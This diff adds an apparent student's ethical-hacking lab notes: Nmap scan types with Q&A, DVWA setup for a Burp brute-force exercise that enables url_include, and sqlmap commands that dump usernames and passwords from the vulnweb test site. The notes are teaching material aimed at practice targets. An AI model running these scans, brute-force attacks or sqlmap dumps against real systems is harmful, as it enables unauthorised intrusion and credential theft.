@@ -1,0 +1,103 @@
+ 1. port scan :
+nmap -sP 192.168.56.0/24
+sudo nmap -sS -p 1-1024 192.168.56.20
+sudo nmap -sA -p 1-1024 192.168.56.20
+sudo nmap -sN -p 1-1024 192.168.56.20
+sudo nmap -sN -p 1-1024 192.168.56.20
+1. What is port scanning and why is it important in cybersecurity?
+Port scanning is the process of sending specially crafted packets to a target system to discover which ports are open, closed, or filtered. It's a fundamental step in network reconnaissance and helps security professionals identify services running on a host, potential vulnerabilities, and firewall behavior.
+2. Explain the working of the PING Scan in Nmap.
+PING Scan checks if a device is online. It sends ICMP (ping) or TCP packets, and if it gets a reply, the system is active.
+3. What is a SYN Scan and why is it called stealthy?
+SYN Scan sends a SYN packet and waits for a reply. If it gets SYN-ACK, the port is open. It doesn't complete the connection, so it's hard to detect — that's why it's stealthy.
+
+4. How does the ACK scan work and what is its purpose?
+ACK Scan sends only an ACK flag. If the system replies with RST, the port is unfiltered. If there’s no reply, it might be blocked by a firewall..
+5. What is the purpose of the NULL Scan?
+NULL Scan sends a packet with no flags. It checks how the system responds and can help find open or filtered ports, especially on older systems.
+6. Describe the XMAS Scan and why it’s named so.
+XMAS scan (-sX) sends TCP packets with FIN, PSH, and URG flags set. It lights up the packet like a Christmas tree, hence the name. It attempts to identify open ports by checking for the absence of responses.
+7. What is the difference between open, closed, and filtered ports in Nmap results?
+Open: A service is listening. Closed: No service is listening, but port is reachable. Filtered: A firewall or filter is preventing access, making it hard to determine port status.
+8. Why do we use Metasploitable as the target in this lab?
+Metasploitable is a vulnerable virtual machine designed for practicing penetration testing in a safe environment. It allows ethical hackers to test real-world attack methods legally.
+9. How can firewalls affect the results of these scans?
+Firewalls can block scan packets or responses, causing ports to appear filtered. They may also log or drop certain types of traffic, affecting scan accuracy.
+10. What are the ethical considerations while performing port scanning?
+Always scan systems with proper authorization. Unauthorized scanning can be illegal and interpreted as malicious activity. Ethical hackers must operate within legal and defined boundaries.
+
+ 2. Perform Brute Force attack using Burp suite:
+ 1.	sudo apt install apache2 php php-mysqli mariadb-server git unzip -y
+2.	cd /var/www/html
+3.	sudo git clone https://github.com/digininja/DVWA.git
+4.	sudo chmod -R 755 /var/www/html/DVWA/
+5.	cd /var/www/html/DVWA/config
+6.	sudo cp config.inc.php.dist config.inc.php
+7.	sudo nano config.inc.php 
+8.	change user as admin and password as password and save and exit
+9.	sudo systemctl start mysql
+10.	sudo su
+11.	mysql -u root -p
+12.	create database dvwa;
+13.	create user ‘admin’@’127.0.0.1’ identified by ‘password’;
+14.	grant all privileges on dvwa.* to ‘admin’@’127.0.0.1’;
+15.	exit
+16.	systemctl restart apache2
+17.	cd /etc/php
+18.	ls n then cd 8.4
+19.	nano php.ini
+20.	press control+f and search for fopen 
+21.	url_fopn = on-
+22.	url_include = on 
+23.	save the file and then again type 
+24.	systemctl restart apache2
+25.	go to browser and type 127.0.0.1/DVWA
+26.	now do the burpsuite condiguration n start attack
+Types of Brute Force Attacks
+1. Simple Brute Force: Tries all possible combinations of passwords.
+2. Dictionary Attack: Uses a predefined list of common passwords.
+3. Hybrid Attack: Combines dictionary words with numbers/special characters.
+4. Credential Stuffing: Uses previously leaked username-password pairs.
+
+To learn simulation of SQL injection attack
+sudo apt update
+sudo apt install sqlmap -y
+🔹 Step 1: Basic SQL Injection Test
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" --dbs
+Explanation:
+•	-u: Target URL
+•	--dbs: Enumerates all databases if vulnerable
+Step 2: List Tables from a Specific Database
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart --tables
+Explanation:
+•	-D acuart: Target database
+•	--tables: List all tables in the database
+Step 3: List Columns in a Specific Table
+Suppose you found a table called users, then:
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users --columns
+Explanation:
+•	-T users: Target table
+•	--columns: List all columns in the table
+Step 4: Dump Specific Column Data
+To extract usernames:
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users -C uname --dump
+To extract passwords:
+sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users -C pass –dump
+What is SQL Injection? 
+SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with an application’s database queries. By injecting malicious SQL statements, an attacker can bypass authentication, retrieve, modify, or delete data, and even execute system-level commands. 
+Types of SQL Injection 
+1. Boolean-Based SQL Injection – Uses conditional statements to determine true/false responses. 
+2. Time-Based SQL Injection – Uses database-specific time delays to infer injection success. 
+3. Error-Based SQL Injection – Exploits database error messages to extract data. 
+4. Union-Based SQL Injection – Uses the UNION SQL operator to fetch data from multiple tables. 
+5. Blind SQL Injection – Extracts data indirectly by analyzing responses or delays. 
+
+
+What is SQLMap? 
+SQLMap is an open-source penetration testing tool that automates SQL injection detection and exploitation. It supports multiple database management systems (MySQL, PostgreSQL, Oracle, etc.) and various SQL injection techniques.
+CONCLUSION
+Using SQLMap, we successfully identified and exploited SQL injection vulnerabilities in the target website. We enumerated databases, listed tables and columns, and extracted sensitive data. This highlights the critical impact of SQL injection and the need for secure coding practices such as:
+•	Using parameterized queries or prepared statements
+•	Deploying web application firewalls (WAF)
+•	Conducting regular security audits and patching vulnerabilities
+SQLMap is a powerful tool meant strictly for authorized ethical hacking and security testing.
